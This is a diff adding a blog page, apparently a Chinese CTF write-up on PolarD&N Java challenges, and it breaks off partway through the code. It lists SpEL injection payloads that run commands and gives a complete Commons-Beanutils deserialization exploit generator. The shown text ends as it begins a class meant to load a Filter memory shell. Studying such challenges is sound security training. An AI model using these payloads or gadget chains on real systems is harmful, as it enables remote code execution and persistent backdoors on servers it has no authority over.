@@ -1,0 +1,709 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/favicon.ico">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Jednersaous">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Java Writeup (continue updating)">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PolarD&amp;N Java专题">
+<meta property="og:url" content="http://example.com/2025/04/23/JAVA_Problem/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Java Writeup (continue updating)">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/page_icon/writeup.png">
+<meta property="article:published_time" content="2025-04-23T09:00:00.000Z">
+<meta property="article:modified_time" content="2025-04-23T08:42:28.741Z">
+<meta property="article:author" content="Jednersaous">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="writeup">
+<meta property="article:tag" content="Java">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/page_icon/writeup.png">
+  
+  
+  
+  <title>PolarD&amp;N Java专题 - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+</head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Hello, it&#39;s jednersaous</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="PolarD&amp;N Java专题"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-04-23 17:00" pubdate>
+          2025年4月23日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          42 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">PolarD&amp;N Java专题</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <style>
+  /* 设置整个页面的字体 */
+  html, body, .markdown-body {
+    font-weight: 600;
+  }
+</style>
+
+<h2 id="ezjava"><a href="#ezjava" class="headerlink" title="ezjava"></a>ezjava</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping(&#123;&quot;/SPEL&quot;&#125;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">spel</span> &#123;<br>    <span class="hljs-meta">@RequestMapping(&#123;&quot;/vul&quot;&#125;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">spelVul</span><span class="hljs-params">(String ex)</span> &#123;<br>        <span class="hljs-type">ExpressionParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<br>        <span class="hljs-type">EvaluationContext</span> <span class="hljs-variable">evaluationContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StandardEvaluationContext</span>();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> parser.parseExpression(ex).getValue(evaluationContext).toString();<br>        System.out.println(result);<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="SPEL注入-Spring-Expression-Language"><a href="#SPEL注入-Spring-Expression-Language" class="headerlink" title="SPEL注入(Spring Expression Language)"></a>SPEL注入(Spring Expression Language)</h3><p><a target="_blank" rel="noopener" href="http://rui0.cn/archives/1043">由浅入深SpEL表达式注入漏洞</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bitterz/p/15206255.html">绕过可以看这个的最后</a></p>
+<ul>
+<li>T(类名)，可以指定使用一个类的类方法<br><code>T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)</code><br>这里后端会执行语句，然后由于类型转换问题出现报错，所以没有返回值，springboot抛出空白页和500，但是计算器依然弹出</li>
+<li>new 类名，可以直接new一个对象，再执行其中的方法<br><code>new java.lang.ProcessBuilder(&quot;cmd&quot;,&quot;/c&quot;,&quot;calc&quot;).start()</code><br>类名最好用全限类名，也就是具体到某个包，不然会因为找不到具体类而报错</li>
+<li>SpEL语法</li>
+</ul>
+<figure class="highlight nim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nim"><span class="hljs-comment">#&#123;1 + 1&#125; 用于执行SpEl表达式，并将值赋给属性</span><br>$<span class="hljs-meta">&#123;...&#125;</span> 主要用于加载外部属性文件中的值<br></code></pre></td></tr></table></figure>
+<p>两者还可以混合使用，但需要注意的是{}中的内容必须符合SpEL表达式。这里需要换一下SpEL的写法，否则会因为没有使用模板解析表达式，在传入#{后出现报错</p>
+<p>常用payload</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$&#123;<span class="hljs-number">7</span>*<span class="hljs-number">7</span>&#125;<br><span class="hljs-function"><span class="hljs-title">T</span><span class="hljs-params">(java.lang.Runtime)</span></span><span class="hljs-selector-class">.getRuntime</span>()<span class="hljs-selector-class">.exec</span>(<span class="hljs-string">&quot;nslookup a.com&quot;</span>)<br><span class="hljs-function"><span class="hljs-title">T</span><span class="hljs-params">(Thread)</span></span><span class="hljs-selector-class">.sleep</span>(<span class="hljs-number">10000</span>)<br><span class="hljs-selector-id">#this</span><span class="hljs-selector-class">.getClass</span>()<span class="hljs-selector-class">.forName</span>(<span class="hljs-string">&#x27;java.lang.Runtime&#x27;</span>)<span class="hljs-selector-class">.getRuntime</span>()<span class="hljs-selector-class">.exec</span>(<span class="hljs-string">&#x27;nslookup a.com&#x27;</span>)<br>new java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.ProcessBuilder</span>(&#123;<span class="hljs-string">&#x27;nslookup a.com&#x27;</span>&#125;)<span class="hljs-selector-class">.start</span>()<br></code></pre></td></tr></table></figure>
+
+<p>本题不好回显 不出网 查了下有两种方法直接写回显<br>BufferedReader</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">new java<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.BufferedReader</span>(new java<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.InputStreamReader</span>(new <span class="hljs-built_in">ProcessBuilder</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;whoami&quot;</span>)<span class="hljs-selector-class">.start</span>()<span class="hljs-selector-class">.getInputStream</span>(), <span class="hljs-string">&quot;gbk&quot;</span>))<span class="hljs-selector-class">.readLine</span>()<br></code></pre></td></tr></table></figure>
+<p>上面这个只有单行输出<br>Scanner</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">new java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.Scanner</span>(new java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.ProcessBuilder</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;find / -name flag*&quot;</span>)<span class="hljs-selector-class">.start</span>()<span class="hljs-selector-class">.getInputStream</span>(), <span class="hljs-string">&quot;gbk&quot;</span>)<span class="hljs-selector-class">.useDelimiter</span>(<span class="hljs-string">&quot;asfsfsdfsf&quot;</span>)<span class="hljs-selector-class">.next</span>()<br></code></pre></td></tr></table></figure>
+<p>这个就可以了 flag在&#x2F;app&#x2F;flag.txt</p>
+<h2 id="CB链"><a href="#CB链" class="headerlink" title="CB链"></a>CB链</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IndexController</span><br>&#123;<br>  <span class="hljs-meta">@RequestMapping(&#123;&quot;/&quot;&#125;)</span><br>  <span class="hljs-meta">@ResponseBody</span><br>  <span class="hljs-keyword">public</span> String <span class="hljs-title function_">index</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">ipAddress</span> <span class="hljs-operator">=</span> request.getHeader(<span class="hljs-string">&quot;X-Forwarded-For&quot;</span>);<br>    <span class="hljs-keyword">if</span> (ipAddress == <span class="hljs-literal">null</span>) &#123;<br>      ipAddress = request.getRemoteAddr();<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Welcome PolarCTF~ &lt;br&gt;Client IP Address: &quot;</span> + ipAddress;<br>  &#125;<br>  <br>  <span class="hljs-meta">@RequestMapping(&#123;&quot;/user&quot;&#125;)</span><br>  <span class="hljs-meta">@ResponseBody</span><br>  <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getUser</span><span class="hljs-params">(String user)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">byte</span>[] userBytes = Tools.base64Decode(user);<br>    <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(userBytes));<br>    <span class="hljs-type">User</span> <span class="hljs-variable">userObj</span> <span class="hljs-operator">=</span> (User)in.readObject();<br>    <span class="hljs-keyword">return</span> userObj.getUserNicename();<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>靶机不出网 打恶意类直接执行命令没用 这里题解打了个Filter内存马</p>
+<p>用yakit传的话 base64编码之后记得还得url编码特殊字符一下</p>
+<p>之前一直拿CB1.8.3传payload 一直不通 这个版本还是得匹配上才行啊 这里是CB1.9.2</p>
+<p>思路是基本CB加载恶意类 + 恶意类接受Filter参数并给Filter一个触发点 + Filter类实现rce</p>
+<h3 id="CB加载恶意类"><a href="#CB加载恶意类" class="headerlink" title="CB加载恶意类"></a>CB加载恶意类</h3><p>用我博客里的CB链也可以</p>
+<p>这个EXP是用ysoserial的模版改的 主要就是构造templates这边集成到一个函数里了 同时也不用写编译出类的路径</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> createTemplatesImpl(MyClassLoader.class);<br>        <span class="hljs-comment">// mock method name until armed</span><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-literal">null</span>, String.CASE_INSENSITIVE_ORDER);<br>        <span class="hljs-comment">// create queue with numbers and basic comparator</span><br>        <span class="hljs-keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;Object&gt;(<span class="hljs-number">2</span>, comparator);<br>        <span class="hljs-comment">// stub data for replacement later</span><br>        queue.add(<span class="hljs-string">&quot;1&quot;</span>);<br>        queue.add(<span class="hljs-string">&quot;1&quot;</span>);<br><br>        <span class="hljs-comment">// switch method called by comparator</span><br>        setFieldValue(comparator, <span class="hljs-string">&quot;property&quot;</span>, <span class="hljs-string">&quot;outputProperties&quot;</span>);<br><br>        <span class="hljs-comment">// switch contents of queue</span><br>        <span class="hljs-keyword">final</span> Object[] queueArray = (Object[]) getFieldValue(queue, <span class="hljs-string">&quot;queue&quot;</span>);<br>        queueArray[<span class="hljs-number">0</span>] = templates;<br>        queueArray[<span class="hljs-number">1</span>] = templates;<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        objectOutputStream.writeObject(queue);<br>        <span class="hljs-type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();<br>        System.out.println(Base64.getEncoder().encodeToString(bytes));<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; T <span class="hljs-title function_">createTemplatesImpl</span><span class="hljs-params">(Class c)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Class&lt;T&gt; tplClass = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">if</span> (Boolean.parseBoolean(System.getProperty(<span class="hljs-string">&quot;properXalan&quot;</span>, <span class="hljs-string">&quot;false&quot;</span>))) &#123;<br>            tplClass = (Class&lt;T&gt;) Class.forName(<span class="hljs-string">&quot;org.apache.xalan.xsltc.trax.TemplatesImpl&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            tplClass = (Class&lt;T&gt;) TemplatesImpl.class;<br>        &#125;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">T</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> tplClass.newInstance();<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">byte</span>[] classBytes = classAsBytes(c);<br><br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;<br>                classBytes<br>        &#125;);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;Pwnr&quot;</span>);<br>        <span class="hljs-keyword">return</span> templates;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object fieldValue)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> obj.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">classField</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>        classField.setAccessible(<span class="hljs-literal">true</span>);<br>        classField.set(obj, fieldValue);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getFieldValue</span><span class="hljs-params">(Object obj, String fieldName)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        Class&lt;?&gt; clazz = obj.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">classField</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>        classField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-keyword">return</span> classField.get(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] classAsBytes(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> classAsFile(clazz);<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> clazz.getClassLoader().getResourceAsStream(file);<br>            <span class="hljs-keyword">if</span> (in == <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IOException</span>(<span class="hljs-string">&quot;couldn&#x27;t find &#x27;&quot;</span> + file + <span class="hljs-string">&quot;&#x27;&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">int</span> len;<br>            <span class="hljs-keyword">while</span> ((len = in.read(buffer)) != -<span class="hljs-number">1</span>) &#123;<br>                out.write(buffer, <span class="hljs-number">0</span>, len);<br>            &#125;<br>            <span class="hljs-keyword">return</span> out.toByteArray();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">classAsFile</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz)</span> &#123;<br>        <span class="hljs-keyword">return</span> classAsFile(clazz, <span class="hljs-literal">true</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">classAsFile</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-type">boolean</span> suffix)</span> &#123;<br>        String str;<br>        <span class="hljs-keyword">if</span> (clazz.getEnclosingClass() == <span class="hljs-literal">null</span>) &#123;<br>            str = clazz.getName().replace(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;/&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            str = classAsFile(clazz.getEnclosingClass(), <span class="hljs-literal">false</span>) + <span class="hljs-string">&quot;$&quot;</span> + clazz.getSimpleName();<br>        &#125;<br>        <span class="hljs-keyword">if</span> (suffix) &#123;<br>            str += <span class="hljs-string">&quot;.class&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> str;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="MyClassLoader-恶意类"><a href="#MyClassLoader-恶意类" class="headerlink" title="MyClassLoader(恶意类)"></a>MyClassLoader(恶意类)</h3><p>首先获取一手Web上下文 这边有点盲区了 这里还自动getSession()了 为后面能看见JSESSIONID埋下了伏笔（</p>
+<p>然后就是反射调用ClassLoader::defineClass() 加载我们后面要说的Filter内存马 算是另一个恶意类</p>
+<p>通过<code>cc.newInstance().equals(new Object[]&#123;request,response,session&#125;);</code>实例化内存马 通过equals()传参</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClassLoader</span> <span 